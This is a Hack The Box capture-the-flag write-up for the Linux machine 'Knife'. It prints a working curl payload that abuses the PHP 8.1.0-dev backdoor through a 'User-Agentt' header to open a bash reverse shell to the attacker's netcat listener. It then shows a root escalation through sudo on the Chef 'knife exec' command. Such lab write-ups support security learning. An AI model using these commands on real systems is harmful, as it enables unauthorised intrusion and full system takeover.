# Target
| Category          | Details                                            |
|-------------------|----------------------------------------------------|
| 📝 **Name**       | [Knife](https://app.hackthebox.com/machines/Knife) |  
| 🏷 **Type**       | HTB Machine                                        |
| 🖥 **OS**         | Linux                                              |
| 🎯 **Difficulty** | Easy                                               |
| 📁 **Tags**       | PHP/8.1.0-dev, sudo, knife                         |

# Scan
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
```

# Attack path
1. [Gain initial foothold using backdoor in PHP/8.1.0-dev](#gain-initial-foothold-using-backdoor-in-php810-dev)
2. [Escalate to `root` user using misconfigured sudo for Chef `knife` command](#escalate-to-root-user-using-misconfigured-sudo-for-chef-knife-command)

### Gain initial foothold using backdoor in PHP/8.1.0-dev

#### Listen for reverse shell connection with `netcat`
```
┌──(magicrc㉿perun)-[~/attack/HTB Knife]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using backdoor in `User-Agentt` HTTP header
```
┌──(magicrc㉿perun)-[~/attack/HTB Knife]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
LPORT=4444
curl http://$TARGET -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\");"
```

#### Receive reverse shell connection
```
connect to [10.10.14.81] from (UNKNOWN) [10.129.167.153] 40454
bash: cannot set terminal process group (891): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
```

### Escalate to `root` user using misconfigured sudo for Chef `knife` command

#### List allowed sudo commands
```
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

#### Spawn root shell using `knife exec` command
```
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)
```